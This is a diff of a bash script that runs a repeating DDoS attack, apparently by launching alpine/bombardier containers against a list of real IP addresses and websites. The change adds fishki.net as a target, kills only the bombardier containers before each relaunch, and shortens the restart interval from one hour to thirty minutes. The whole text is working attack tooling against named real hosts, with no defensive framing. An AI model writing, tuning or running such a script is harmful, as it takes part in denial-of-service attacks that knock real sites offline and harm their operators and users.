@@ -187,15 +187,16 @@ declare -a sites=(
   "https://5.61.23.11"
   "https://217.20.155.13"
   "https://217.20.147.1"
+  "https://fishki.net/"
 )
 
 while :
 do
-  echo "Stop all containers"
+  echo "Kill all useless containers"
 
-  docker stop $(docker ps -aq)
+  docker container kill $(docker ps -aqf ancestor=alpine/bombardier)
 
-  echo "Docker containers stopped"
+  echo "Docker useless containers killed"
 
   echo "Run ddos for all sites"
   for site in "${sites[@]}"; do
@@ -226,7 +227,7 @@ do
 
   echo "DDoS is up and running..."
 
-  sleep 1h
+  sleep 30m
 
   echo "Restarting DDoS, checking which sites are still working"
 done
